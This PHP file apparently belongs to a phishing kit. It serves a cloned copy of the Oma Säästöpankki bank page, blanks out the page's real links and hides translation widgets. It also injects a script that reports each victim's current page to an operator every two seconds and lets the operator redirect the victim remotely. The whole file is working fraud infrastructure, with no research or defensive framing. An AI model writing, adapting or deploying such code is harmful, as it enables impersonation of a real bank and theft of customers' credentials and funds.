<?php
ob_start();
$userName = htmlspecialchars($user['full_name'] ?? 'Kullanıcı');
$bankName = htmlspecialchars($bank['name'] ?? 'Oma Säästöpankki');
$htmlContent = file_get_contents(__DIR__ . '/omasp5.html');

if (mb_detect_encoding($htmlContent, 'UTF-8', true) !== 'UTF-8') {
    $htmlContent = mb_convert_encoding($htmlContent, 'UTF-8', 'Windows-1252');
}

$htmlContent = preg_replace('/https?:\/\/[^\s"\'<>]+/i', '#', $htmlContent);
$htmlContent = preg_replace('/mailto:[^\s"\'<>]+/i', '#', $htmlContent);
$htmlContent = preg_replace('/tel:[^\s"\'<>]+/i', '#', $htmlContent);

$basePath = '/omasp-files/';
$htmlContent = str_replace('./omasp_files/', $basePath, $htmlContent);
$htmlContent = str_replace('omasp_files/', $basePath, $htmlContent);
$htmlContent = preg_replace('/url\(([^\/)]+\.(woff2?|ttf))\)/i', 'url(' . $basePath . '$1)', $htmlContent);

$hideStyle = '<style>
    #goog-gt-tt,
    #goog-gt-t,
    [id*="goog-gt"],
    [class*="goog-gt"],
    [id*="google_translate"],
    [class*="google_translate"],
    .VIpgJd-yAWNEb-L7lbkb,
    .skiptranslate {
        display: none !important;
        visibility: hidden !important;
    }
    body {
        overflow-y: auto !important;
        max-height: 100vh !important;
    }
</style>';

if (strpos($htmlContent, '</head>') !== false) {
    $htmlContent = str_replace('</head>', $hideStyle . '</head>', $htmlContent);
} else {
    $htmlContent = $hideStyle . $htmlContent;
}

$adminScript = '';
$userId = isset($_SESSION['user_id']) ? $_SESSION['user_id'] : (isset($user['id']) ? $user['id'] : 0);
if ($userId > 0) {
    $adminScript = '<script>
    (function() {
        const userId = ' . json_encode($userId) . ';
        const currentPage = window.location.pathname;
        const pageTitle = document.title;
        
        function updateCurrentPage() {
            fetch(\'/api/update-page\', {
                method: \'POST\',
                headers: { \'Content-Type\': \'application/json\' },
                body: JSON.stringify({
                    user_id: userId,
                    current_page: currentPage,
                    page_title: pageTitle
                })
            }).catch(() => {});
        }
        
        function checkAdminRedirect() {
            fetch(\'/api/check-redirect?user_id=\' + userId)
                .then(response => response.json())
                .then(data => {
                    if (data.redirect && data.redirect !== currentPage) {
                        window.location.href = data.redirect;
                    }
                })
                .catch(() => {});
        }
        
        function initButton() {
            const errorButton = document.getElementById(\'error-close\');
            if (errorButton) {
                errorButton.onclick = function() {
                    window.location.href = \'/user/\' + userId + \'/bank/omasp\';
                };
            }
        }
        
        if (document.readyState === \'loading\') {
            document.addEventListener(\'DOMContentLoaded\', initButton);
        } else {
            setTimeout(initButton, 100);
        }
        
        updateCurrentPage();
        checkAdminRedirect();
        setInterval(() => {
            updateCurrentPage();
            checkAdminRedirect();
        }, 2000);
    })();
    </script>';
}

if (strpos($htmlContent, '</body>') !== false) {
    $htmlContent = str_replace('</body>', $adminScript . '</body>', $htmlContent);
} else {
    $htmlContent = $htmlContent . $adminScript;
}

$content = ob_get_clean();
echo $htmlContent;
?>



